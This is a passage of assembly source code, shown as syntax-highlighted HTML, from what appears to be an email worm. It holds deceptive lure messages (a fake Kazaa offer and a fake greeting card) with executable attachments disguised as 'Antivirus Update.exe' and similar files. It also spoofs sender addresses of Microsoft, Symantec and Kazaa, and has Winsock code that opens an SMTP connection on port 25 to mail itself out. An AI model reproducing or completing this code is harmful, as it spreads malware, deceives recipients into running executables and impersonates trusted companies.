    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"--bound1"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Type: application/octet-stream;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">' name= "Antivirus Update.exe"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Transfer-Encoding: base64"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Disposition: attachment;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'   filename= "Antivirus Update.exe"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">

    </span><span class="sc5">SizeOfMessageAndFileName3</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MessageAndFileName3</span><span class="sc4">)</span><span class="sc0"> 
        
    
</span><span class="sc5">MessageAndFileName4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Dear User."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Sharman Networks Wants To offer You The New"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Version Of Kazaa !!!"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Please Read Product Description Below:"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Kazaa Media Desktop is the world's No. 1"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"free, peer-to-peer, file-sharing software"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"application. Features include improved"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"privacy protection; the ability to search"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"for and download music, playlists, software,"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"video files, documents, and images; the"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ability to set up and manage music and video"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"playlists; and the ability to perform"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"multiple simultaneous searches, including"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"up to five Search Mores, which deliver up"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"to 1,000 results per search term."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"We Have Included A Free Version Of Kazaa In"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"This Mail,Try It !!!"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Thank You."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc3">"Sharman Networks."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"If you do not wish to receive future E-mail's from"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Sharman Networks, or believe you were subscribed in"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"error, please send a blank E-mail to Remove@kazaa.com"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"--bound1"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Type: application/octet-stream;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">' name= "Kazaa Media Desktop.exe"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Transfer-Encoding: base64"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Disposition: attachment;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'   filename= "Kazaa Media Desktop.exe"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">

    </span><span class="sc5">SizeOfMessageAndFileName4</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MessageAndFileName4</span><span class="sc4">)</span><span class="sc0"> 
        

</span><span class="sc5">MessageAndFileName5</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Greeting-Cards.com have sent you a Greeting Card"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"One Of Your Friends Wish You Happy Year"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Love,Fun,Good Life,And Good Luck."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"To Show His Love He Sent You A Greeting"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Card,Congratulations !"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Hope you enjoy our e-cards! Spread the love and send one of our FREE e-cards!"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Brought to you by greeting-cards.com - a better way to greet for FREE! "</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Please Visit Greeting Cards Web site:http://www.greeting-cards.com/"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"--bound1"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Type: application/octet-stream;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">' name= "Your Greeting Card.exe"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Transfer-Encoding: base64"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Content-Disposition: attachment;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'   filename= "Your Greeting Card.exe"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">

    </span><span class="sc5">SizeOfMessageAndFileName5</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MessageAndFileName5</span><span class="sc4">)</span><span class="sc0"> 
        

    
</span><span class="sc5">EndOfMail</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc3">"--bound1--"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    
    </span><span class="sc5">SizeOfEndOfMail</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EndOfMail</span><span class="sc4">)</span><span class="sc0">
    
    
    
    </span><span class="sc5">HELO</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"HELO &lt;localhost&gt;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">SizeOfHELO</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">HELO</span><span class="sc4">)</span><span class="sc0">
    
    
    </span><span class="sc5">MAILFROM1</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"MAIL FROM:&lt;SecurityUpdate@Microsoft.com&gt;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">SizeOfMailFrom1</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MAILFROM1</span><span class="sc4">)</span><span class="sc0">

    </span><span class="sc5">MAILFROM2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"MAIL FROM:&lt;FreePictures@WorldSex.com&gt;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">SizeOfMailFrom2</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MAILFROM2</span><span class="sc4">)</span><span class="sc0">

    </span><span class="sc5">MAILFROM3</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"MAIL FROM:&lt;VirusAlert@Symantec.com&gt;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">SizeOfMailFrom3</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MAILFROM3</span><span class="sc4">)</span><span class="sc0">

    </span><span class="sc5">MAILFROM4</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"MAIL FROM:&lt;Support@Kazaa.com&gt;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">SizeOfMailFrom4</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MAILFROM4</span><span class="sc4">)</span><span class="sc0">

    </span><span class="sc5">MAILFROM5</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"MAIL FROM:&lt;Greets@Greeting-Cards.com&gt;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">SizeOfMailFrom5</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MAILFROM5</span><span class="sc4">)</span><span class="sc0">
    
    
    </span><span class="sc5">QUIT</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"QUIT"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">SizeOfQuit</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">QUIT</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">RCPT</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"RCPT TO:&lt;"</span><span class="sc0">
    </span><span class="sc5">SizeOfRcpt</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">RCPT</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">EndOfRCPT</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"&gt;"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">SizeOfEndRcpt</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EndOfRCPT</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">__DATA</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"DATA"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">SizeOfData</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">__DATA</span><span class="sc4">)</span><span class="sc0">
    
    </span><span class="sc5">GetBuffer</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ffh</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    
    </span><span class="sc5">VERSION1_1</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0101h</span><span class="sc0">
    </span><span class="sc5">AF_INET</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">      
    </span><span class="sc5">SOCK_STREAM</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">     
    </span><span class="sc5">SOCKET_ERR</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">   
    </span><span class="sc5">HOSTENT_IP</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc5">IPPROTO_TCP</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6h</span><span class="sc0">
    
    </span><span class="sc5">vsocket</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WSADATA</span><span class="sc4">:</span><span class="sc0">    
    </span><span class="sc5">mVersion</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">mHighVersion</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">szDescription</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">257</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">szSystemStatus</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">129</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">iMaxSockets</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">iMaxUpdDg</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">lpVendorInfo</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">SOCKADDR</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">sin_family</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">   
    </span><span class="sc5">sin_port</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">sin_addr</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       
    </span><span class="sc5">sin_zero</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">SizeOfSOCKADDR</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">SOCKADDR</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">ConnectToServer</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;connect to smtp server</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WSADATA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">VERSION1_1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WSAStartup</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;start up winsock</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ConnectionErr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">IPPROTO_TCP</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SOCK_STREAM</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">AF_INET</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socket</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;create socket</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SOCKET_ERR</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">WSACleanErr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">25</span><span class="sc0">          </span><span class="sc1">;smtp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">htons</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sin_port</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sin_family</span><span class="sc4">],</span><span class="sc5">AF_INET</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SmtpServerAdd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">gethostbyname</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CloseSockErr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">HOSTENT_IP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sin_addr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfSOCKADDR</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SOCKADDR</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">connect</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseSockErr</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CloseSockErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">WSACleanErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WSACleanup</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ConnectionErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


